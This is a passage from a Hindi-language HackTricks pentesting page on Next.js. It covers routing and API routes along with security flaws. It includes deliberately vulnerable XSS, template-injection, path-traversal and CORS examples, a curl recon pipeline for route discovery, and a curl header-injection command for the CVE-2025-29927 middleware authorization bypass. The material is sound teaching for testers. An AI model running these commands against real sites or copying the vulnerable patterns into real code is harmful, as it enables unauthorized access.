# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Next.js एप्लिकेशन की सामान्य वास्तुकला

### सामान्य फ़ाइल संरचना

एक मानक Next.js प्रोजेक्ट एक विशिष्ट फ़ाइल और डायरेक्टरी संरचना का पालन करता है जो रूटिंग, API endpoints और स्थैतिक एसेट प्रबंधन जैसे फीचर्स को सक्षम बनाती है। यहाँ एक सामान्य लेआउट है:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### मुख्य निर्देशिकाएँ और फ़ाइलें

- **public/:** इमेज, फ़ॉन्ट और अन्य स्टैटिक फाइलों जैसे static assets को होस्ट करता है। यहां की फाइलें रूट पाथ (`/`) पर पहुँच योग्य होती हैं।
- **app/:** आपके एप्लिकेशन के pages, layouts, components और API routes के लिए केंद्रीय डायरेक्टरी। यह **App Router** पैरेडाइम को अपनाता है, जिससे उन्नत राउटिंग सुविधाएँ और server-client component पृथक्करण संभव होता है।
- **app/layout.tsx:** आपके एप्लिकेशन के लिए रूट लेआउट को परिभाषित करता है, सभी पृष्ठों को रैप करता है और headers, footers और navigation bars जैसे स्थिर UI तत्व प्रदान करता है।
- **app/page.tsx:** रूट रूट (`/`) के लिए एंट्री पॉइंट के रूप में कार्य करता है और होम पेज रेंडर करता है।
- **app/[route]/page.tsx:** स्टैटिक और डायनेमिक रूट्स दोनों को संभालता है। `app/` के अंदर हर फ़ोल्डर एक route segment का प्रतिनिधित्व करता है, और उन फ़ोल्डरों के अंदर `page.tsx` उस रूट के component के अनुरूप होता है।
- **app/api/:** API routes रखता है, जो HTTP अनुरोधों को संभालने के लिए serverless functions बनाने की अनुमति देता है। ये रूट पारंपरिक `pages/api` डायरेक्टरी की जगह लेते हैं।
- **app/components/:** पुन: उपयोग योग्य React components को रखता है जिन्हें विभिन्न पृष्ठों और लेआउट्स में इस्तेमाल किया जा सकता है।
- **app/styles/:** ग्लोबल CSS फाइलें और component-scoped styling के लिए CSS Modules रखता है।
- **app/utils/:** यूटिलिटी फ़ंक्शन, हेल्पर मॉड्यूल और अन्य non-UI लॉजिक शामिल करता है जिन्हें एप्लिकेशन में साझा किया जा सकता है।
- **.env.local:** स्थानीय डेवलपमेंट वातावरण के लिए विशिष्ट environment variables संग्रहित करता है। ये वेरिएबल्स version control में कमिट नहीं किए जाते हैं।
- **next.config.js:** Next.js के व्यवहार को अनुकूलित करता है, जिसमें webpack configurations, environment variables और security settings शामिल हैं।
- **tsconfig.json:** प्रोजेक्ट के लिए TypeScript सेटिंग्स को कॉन्फ़िगर करता है, जिससे type checking और अन्य TypeScript सुविधाएँ सक्षम होती हैं।
- **package.json:** प्रोजेक्ट डिपेंडेंसीज़, स्क्रिप्ट और मेटाडेटा का प्रबंधन करता है।
- **README.md:** प्रोजेक्ट के बारे में दस्तावेज़ और जानकारी प्रदान करता है, जिसमें सेटअप निर्देश, उपयोग निर्देश और अन्य प्रासंगिक विवरण शामिल हैं।
- **yarn.lock / package-lock.json:** प्रोजेक्ट की डिपेंडेंसीज़ को विशिष्ट संस्करणों पर लॉक करते हैं, जिससे विभिन्न वातावरणों में सुसंगत इंस्टॉलेशन्स सुनिश्चित होती हैं।

## Next.js में क्लाइंट-साइड

### `app` डायरेक्टरी में फाइल-आधारित राउटिंग

`app` डायरेक्टरी नवीनतम Next.js वर्शन में राउटिंग की आधारशिला है। यह फ़ाइल सिस्टम का उपयोग करके राउट्स को परिभाषित करता है, जिससे रूट प्रबंधन सहज और स्केलेबल बन जाता है।

<details>

<summary>रूट पथ / को हैंडल करना</summary>

**फ़ाइल संरचना:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**मुख्य फाइलें:**

- **`app/page.tsx`**: रूट पाथ `/` के अनुरोधों को हैंडल करता है।
- **`app/layout.tsx`**: एप्लिकेशन के लिए layout को परिभाषित करता है, जो सभी पेजों को घेरता है।

**इम्प्लीमेंटेशन:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**व्याख्या:**

- **रूट परिभाषा:** app डायरेक्टरी के सीधे अंतर्गत मौजूद `page.tsx` फ़ाइल `/` रूट के अनुरूप होती है।
- **रेंडरिंग:** यह component होम पेज की सामग्री रेंडर करता है।
- **लेआउट एकीकरण:** `HomePage` component को `layout.tsx` द्वारा लपेटा गया है, जो हेडर, फ़ूटर और अन्य सामान्य तत्व शामिल कर सकता है।

</details>

<details>

<summary>अन्य स्टैटिक पथों को संभालना</summary>

**उदाहरण: `/about` रूट**

**फ़ाइल संरचना:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**कार्यान्वयन:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**स्पष्टीकरण:**

- **रूट परिभाषा:** `page.tsx` फ़ाइल `about` फ़ोल्डर के अंदर `/about` रूट के अनुरूप है।
- **रेंडरिंग:** यह कंपोनेंट about पेज के लिए कंटेंट रेंडर करता है।

</details>

<details>

<summary>डायनामिक रूट्स</summary>

डायनामिक रूट्स वेरिएबल सेगमेंट्स वाले पाथ्स को हैंडल करने की अनुमति देते हैं, जिससे एप्लिकेशन IDs, slugs जैसे पैरामीटरों के आधार पर कंटेंट दिखा सकते हैं।

**उदाहरण: `/posts/[id]` रूट**

**फ़ाइल संरचना:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**कार्यान्वयन:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**व्याख्या:**

- **डायनेमिक सेगमेंट:** `[id]` रूट में एक डायनेमिक सेगमेंट को दर्शाता है, जो URL से `id` पैरामीटर को कैप्चर करता है।
- **पैरामीटर एक्सेस करना:** `params` ऑब्जेक्ट डायनेमिक पैरामीटर रखता है, जिसे कम्पोनेंट के अंदर एक्सेस किया जा सकता है।
- **रूट मिलान:** `/posts/*` से मेल खाती कोई भी पथ, जैसे `/posts/1`, `/posts/abc` आदि, इस कम्पोनेंट द्वारा हैंडल की जाएगी।

</details>

<details>

<summary>नेस्टेड रूट्स</summary>

Next.js ने नेस्टेड रूटिंग का समर्थन किया है, जो डायरेक्टरी लेआउट को प्रतिबिंबित करने वाले hierarchical route structures की अनुमति देता है।

**उदाहरण: `/dashboard/settings/profile` रूट**

**फ़ाइल संरचना:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**क्रियान्वयन:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**व्याख्या:**

- **गहरी नेस्टिंग:** `dashboard/settings/profile/` के अंदर मौजूद `page.tsx` फ़ाइल `/dashboard/settings/profile` route के अनुरूप है।
- **हायरार्की का प्रतिबिंब:** डायरेक्टरी संरचना URL पाथ को दर्शाती है, जिससे रख-रखाव और स्पष्टता बेहतर होती है।

</details>

<details>

<summary>Catch-All रूट्स</summary>

Catch-all रूट्स कई nested segments या अज्ञात paths को संभालते हैं, जिससे route handling में लचीलापन मिलता है।

**उदाहरण: `/*` रूट**

**फ़ाइल संरचना:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**कार्यान्वयन:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**व्याख्या:**

- **Catch-All Segment:** `[...slug]` शेष सभी path segments को एक array के रूप में कैप्चर करता है।
- **Usage:** डायनामिक रूटिंग परिदृश्यों को हैंडल करने के लिए उपयोगी, जैसे user-generated paths, nested categories, आदि।
- **Route Matching:** `/anything/here`, `/foo/bar/baz` जैसे paths इस component द्वारा हैंडल किए जाते हैं।

</details>

### संभावित क्लाइंट-साइड कमजोरियाँ

हालाँकि Next.js एक सुरक्षित आधार प्रदान करता है, अनुचित कोडिंग प्रथाएँ कमजोरियाँ पैदा कर सकती हैं। प्रमुख क्लाइंट-साइड कमजोरियों में शामिल हैं:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS attacks तब होते हैं जब दुर्भावनापूर्ण स्क्रिप्ट्स भरोसेमंद वेबसाइट्स में इंजेक्ट की जाती हैं। हमलावर उपयोगकर्ता के ब्राउज़र में स्क्रिप्ट्स को निष्पादित कर सकते हैं, डेटा चुरा सकते हैं या उपयोगकर्ता की ओर से क्रियाएँ करवा सकते हैं।

**Example of Vulnerable Code:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**क्यों यह असुरक्षित है:** `dangerouslySetInnerHTML` का उपयोग अनविश्वसनीय इनपुट के साथ करने पर attackers को हानिकारक स्क्रिप्ट्स इंजेक्ट करने की अनुमति मिलती है।

</details>

<details>

<summary>Client-Side Template Injection</summary>

यह तब होता है जब उपयोगकर्ता इनपुट टेम्पलेट्स में ठीक से हैंडल नहीं होते, जिससे attackers टेम्पलेट्स या अभिव्यक्तियों को इंजेक्ट और निष्पादित कर सकते हैं।

**कमजोर कोड का उदाहरण:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**यह क्यों संवेदनशील है:** यदि `template` या `data` में हानिकारक सामग्री शामिल है, तो यह अनचाहे कोड के निष्पादन का कारण बन सकता है।

</details>

<details>

<summary>Client Path Traversal</summary>

यह एक ऐसा सुरक्षा दोष है जो हमलावरों को client-side paths में छेड़छाड़ करके अनचाहे क्रियाएं करवा देता है, जैसे Cross-Site Request Forgery (CSRF)। server-side path traversal के विपरीत, जो सर्वर की filesystem को लक्षित करता है, CSPT client-side mechanisms का फायदा उठाकर वैध API अनुरोधों को हानिकारक endpoints पर रीरूट करने पर केंद्रित है।

**कमजोर कोड का उदाहरण:**

एक Next.js application उपयोगकर्ताओं को फ़ाइलें अपलोड और डाउनलोड करने की अनुमति देता है। डाउनलोड फ़ीचर client side पर लागू किया गया है, जहाँ उपयोगकर्ता डाउनलोड करने के लिए फ़ाइल पथ निर्दिष्ट कर सकते हैं।
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### हमला परिदृश्य

1. **हमलावर का उद्देश्य**: `filePath` को बदलकर CSRF attack के जरिए एक महत्वपूर्ण फ़ाइल (जैसे `admin/config.json`) को हटाना।
2. **CSPT का शोषण**:
- **हानिकारक इनपुट**: हमलावर एक URL बनाता है जिसमें बदला गया `filePath` होता है जैसे `../deleteFile/config.json`।
- **परिणामी API कॉल**: क्लाइंट-साइड कोड `/api/files/../deleteFile/config.json` पर request भेजता है।
- **सर्वर का व्यवहार**: यदि सर्वर `filePath` को सत्यापित नहीं करता तो वह request को process करता है, जिससे संवेदनशील फ़ाइलें हट सकती हैं या उजागर हो सकती हैं।
3. **CSRF को निष्पादित करना**:
- **बनाया हुआ लिंक**: हमलावर पीड़ित को एक लिंक भेजता है या एक हानिकारक स्क्रिप्ट embed करता है जो बदले हुए `filePath` के साथ download request trigger करती है।
- **परिणाम**: पीड़ित अनजाने में यह कार्रवाई करता है, जिससे अनधिकृत फ़ाइल एक्सेस या हटाना हो सकता है।

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- मूल response से `buildId` प्राप्त करें (अक्सर नीचे छपा होता है) या `<script>` टैग्स से जो `/_next/static/<buildId>/...` लोड करते हैं।
- manifest को प्राप्त करें और routes निकालें:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- पाए गए पथ (for example `/docs`, `/docs/content/examples`, `/signin`) का उपयोग auth testing और endpoint discovery के लिए करें।

## Next.js में सर्वर-साइड

### सर्वर-साइड रेंडरिंग (SSR)

पेज प्रत्येक अनुरोध पर सर्वर पर रेंडर होते हैं, जिससे उपयोगकर्ता को पूरी तरह रेंडर किया गया HTML मिलता है। इस मामले में आपको अनुरोधों को प्रोसेस करने के लिए अपना कस्टम सर्वर बनाना चाहिए।

**उपयोग के मामले:**

- डायनेमिक सामग्री जो अक्सर बदलती है।
- SEO ऑप्टिमाइज़ेशन, क्योंकि search engines पूरी तरह से रेंडर किए गए पेज को crawl कर सकते हैं।

**इम्प्लीमेंटेशन:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### स्टैटिक साइट जनरेशन (SSG)

पेज़ बिल्ड समय पर पहले से रेंडर किए जाते हैं, जिससे लोड समय तेज़ होता है और सर्वर का लोड कम होता है।

**उपयोग के मामले:**

- ऐसी सामग्री जो अक्सर बदलती नहीं है।
- ब्लॉग, दस्तावेज़, मार्केटिंग पृष्ठ।

**क्रियान्वयन:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless फ़ंक्शन्स (API Routes)

Next.js आपको serverless functions के रूप में API endpoints बनाने की अनुमति देता है। ये फ़ंक्शन्स ऑन-डिमांड चलते हैं और किसी समर्पित सर्वर की आवश्यकता नहीं होती।

**उपयोग के मामले:**

- फ़ॉर्म सबमिशन संभालना।
- डेटाबेस के साथ इंटरैक्ट करना।
- डेटा प्रोसेस करना या थर्ड‑पार्टी APIs के साथ इंटीग्रेट करना।

**इम्प्लीमेंटेशन:**

Next.js 13 में `app` directory के परिचय के साथ, routing और API handling अधिक लचीले और शक्तिशाली हो गए हैं। यह आधुनिक तरीका फ़ाइल-आधारित routing सिस्टम के साथ घनिष्ट रूप से मेल खाता है, लेकिन इसमें server और client components के लिए सपोर्ट सहित उन्नत क्षमताएँ भी शामिल हैं।

#### बुनियादी रूट हैंडलर

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**कार्यान्वयन:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**व्याख्या:**

- **स्थान:** API routes `app/api/` डायरेक्टरी के अंदर रखे जाते हैं।
- **फाइल नामकरण:** प्रत्येक API endpoint अपने ही फोल्डर में रहता है जिसमें `route.js` या `route.ts` फाइल होती है।
- **निर्यातित फ़ंक्शन्स:** एक single default export के बजाय, विशिष्ट HTTP method फ़ंक्शंस (जैसे `GET`, `POST`) निर्यात किए जाते हैं।
- **Response Handling:** रिस्पॉन्स वापस करने के लिए `Response` constructor का उपयोग करें, जिससे headers और status codes पर अधिक नियंत्रण मिलता है।

#### अन्य पाथ्स और मेथड्स को कैसे हैंडल करें:

<details>

<summary>विशिष्ट HTTP मेथड्स को हैंडल करना</summary>

Next.js 13+ आपको वही `route.js` या `route.ts` फाइल के भीतर विशिष्ट HTTP मेथड्स के लिए handlers परिभाषित करने की अनुमति देता है, जिससे कोड स्पष्ट और अधिक व्यवस्थित होता है।

**उदाहरण:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**व्याख्या:**

- **Multiple Exports:** प्रत्येक HTTP मेथड (`GET`, `PUT`, `DELETE`) का अपना exported function होता है।
- **Parameters:** दूसरा argument `params` के माध्यम से route parameters तक पहुँच देता है।
- **Enhanced Responses:** response objects पर अधिक नियंत्रण, जो headers और status code के सटीक प्रबंधन को सक्षम बनाता है।

</details>

<details>

<summary>Catch-All और Nested Routes</summary>

Next.js 13+ उन्नत routing सुविधाओं का समर्थन करता है, जैसे catch-all routes और nested API routes, जो अधिक dynamic और scalable API संरचनाओं को संभव बनाते हैं।

**Catch-All Route उदाहरण:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**व्याख्या:**

- **सिंटैक्स:** `[...]` एक catch-all segment को दर्शाता है, जो सभी nested paths को कैप्चर करता है।
- **उपयोग:** ऐसे APIs के लिए उपयोगी जो विभिन्न route depths या dynamic segments को हैंडल करने की आवश्यकता रखते हैं।

**नेस्टेड रूट्स का उदाहरण:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**व्याख्या:**

- **गहरी नेस्टिंग:** संसाधन संबंधों को दर्शाते हुए हायरेकॉिकल API संरचनाओं की अनुमति देता है।
- **पैरामीटर एक्सेस:** `params` object के माध्यम से कई route पैरामीटर आसानी से एक्सेस किए जा सकते हैं।

</details>

<details>

<summary>Next.js 12 और उससे पहले में API routes को संभालना</summary>

## `pages` Directory में API Routes (Next.js 12 और उससे पहले)

Next.js 13 ने `app` directory और उन्नत routing क्षमताएँ पेश करने से पहले, API routes मुख्यतः `pages` डिरेक्टरी के भीतर परिभाषित किए जाते थे। यह तरीका अभी भी Next.js 12 और पहले के संस्करणों में व्यापक रूप से उपयोग और समर्थित है।

#### बुनियादी API Route

**फ़ाइल संरचना:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**कार्यान्वयन:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**व्याख्या:**

- **Location:** API routes `pages/api/` निर्देशिका के अंतर्गत स्थित होते हैं।
- **Export:** हैंडलर फ़ंक्शन को परिभाषित करने के लिए `export default` का उपयोग करें।
- **Function Signature:** हैंडलर को `req` (HTTP request) और `res` (HTTP response) ऑब्जेक्ट्स प्राप्त होते हैं।
- **Routing:** फ़ाइल नाम (`hello.js`) एन्डपॉइंट `/api/hello` से मैप होता है।

#### डायनामिक API रूट्स

**फ़ाइल संरचना:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**कार्यान्वयन:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**व्याख्या:**

- **डायनेमिक सेगमेंट:** Square brackets (`[id].js`) डायनेमिक रूट सेगमेंट को दर्शाते हैं।
- **पैरामीटर तक पहुँच:** `req.query.id` का उपयोग डायनेमिक पैरामीटर तक पहुँचने के लिए करें।
- **मेथड हैंडलिंग:** शर्तीय तर्क का उपयोग करें ताकि अलग-अलग HTTP मेथड्स (`GET`, `PUT`, `DELETE`, आदि) को हैंडल किया जा सके।

#### अलग-अलग HTTP मेथड्स को हैंडल करना

जबकि बेसिक API route उदाहरण एक ही फंक्शन के भीतर सभी HTTP मेथड्स को हैंडल करता है, आप बेहतर स्पष्टता और मेंटेनबिलिटी के लिए अपने कोड को इस तरह संरचित कर सकते हैं कि हर मेथड को स्पष्ट रूप से हैंडल किया जाए।

**उदाहरण:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**सर्वोत्तम प्रथाएँ:**

- **Separation of Concerns:** विभिन्न HTTP methods के लिए लॉजिक को स्पष्ट रूप से अलग रखें।
- **Response Consistency:** client-side हैंडलिंग को आसान बनाने के लिए response structures को सुसंगत रखें।
- **Error Handling:** असमर्थित methods और अप्रत्याशित errors को gracefully हैंडल करें।

</details>

### CORS कॉन्फ़िगरेशन

नियंत्रण करें कि कौन से origins आपके API routes तक पहुँच सकते हैं, जिससे Cross-Origin Resource Sharing (CORS) vulnerabilities कम हों।

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
ध्यान दें कि **CORS को सभी API routes में भी कॉन्फ़िगर किया जा सकता है** के अंदर **`middleware.ts`** फ़ाइल:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**समस्या:**

- **`Access-Control-Allow-Origin: '*'`:** कोई भी वेबसाइट API तक पहुँचने की अनुमति देता है, जिससे संभावित रूप से दुर्भावनापूर्ण साइटें बिना प्रतिबंध के आपके API के साथ इंटरैक्ट कर सकती हैं।
- **Wide Method Allowance:** सभी HTTP methods की अनुमति देने से attackers अनचाहे क्रियाएँ कर सकते हैं।

कैसे attackers इसका फायदा उठाते हैं:

Attackers शातिर वेबसाइटें बना सकते हैं जो आपके API को अनुरोध भेजती हैं, संभावित रूप से डेटा पुनःप्राप्ति, डेटा संशोधन या प्रमाणीकृत उपयोगकर्ताओं की ओर से अनचाहे क्रियाएँ ट्रिगर करने जैसी कार्यक्षमताओं का दुरुपयोग कर सकती हैं।


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### क्लाइंट साइड में सर्वर कोड का खुलासा

यह आसान हो सकता है कि सर्वर द्वारा उपयोग किया गया code क्लाइंट साइड में एक्सपोज़ और उपयोग होने वाले code में भी शामिल हो जाए। किसी code फ़ाइल को क्लाइंट साइड में कभी एक्सपोज़ न होने देना सुनिश्चित करने का सबसे अच्छा तरीका है कि फ़ाइल की शुरुआत में इस import का उपयोग किया जाए:
```js
import "server-only"
```
## प्रमुख फ़ाइलें और उनकी भूमिकाएँ

### `middleware.ts` / `middleware.js`

**Location:** प्रोजेक्ट की root डायरेक्टरी या `src/` के भीतर।

**Purpose:** request प्रोसेस होने से पहले server-side serverless function में कोड execute करता है, जिससे authentication, redirects, या responses को modify करने जैसे काम किए जा सकते हैं।

**Execution Flow:**

1. **Incoming Request:** middleware उस request को intercept करता है।
2. **Processing:** request के आधार पर operations perform करता है (उदा., authentication चेक करना)।
3. **Response Modification:** response को बदल सकता है या control अगले handler को दे सकता है।

**Example Use Cases:**

- Unauthenticated users को redirect करना।
- Custom headers जोड़ना।
- Requests को logging करना।

**Sample Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

यदि middleware में authorization लागू है, तो प्रभावित Next.js रिलीज़ (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3>) को `x-middleware-subrequest` हेडर इंजेक्ट करके bypass किया जा सकता है। फ्रेमवर्क middleware recursion को स्किप करेगा और सुरक्षित पेज वापस कर देगा।

- Baseline व्यवहार आमतौर पर `/api/auth/signin` जैसे login route पर 307 redirect होता है।
- प्रतिक्रिया को 200 में बदलने के लिए लंबा `x-middleware-subrequest` मान भेजें (MAX_RECURSION_DEPTH तक पहुँचने के लिए `middleware` को दोहराएँ):
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- क्योंकि authenticated pages कई subresources खींचते हैं, हर request में header जोड़ें (उदा., Burp Match/Replace में एक empty match string) ताकि assets redirect न हों।

### `next.config.js`

**Location:** प्रोजेक्ट की रूट डायरेक्टरी।

**Purpose:** Next.js के व्यवहार को configure करता है — features enable/disable करना, webpack configurations customize करना, environment variables सेट करना, और कई security features configure करना।

**Key Security Configurations:**

<details>

<summary>सुरक्षा हेडर</summary>

सुरक्षा हेडर आपके application की सुरक्षा बढ़ाते हैं और browsers को यह निर्देश देते हैं कि content को कैसे handle करना है। ये विभिन्न हमलों जैसे Cross-Site Scripting (XSS), Clickjacking, और MIME type sniffing को कम करने में मदद करते हैं:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Examples:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>इमेज ऑप्टिमाइज़ेशन सेटिंग्स</summary>

Next.js इमेजेस को प्रदर्शन के लिए optimize करता है, लेकिन misconfigurations सुरक्षा कमजोरियों का कारण बन सकते हैं, जैसे कि untrusted sources को malicious content inject करने की अनुमति देना।

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**समस्या:**

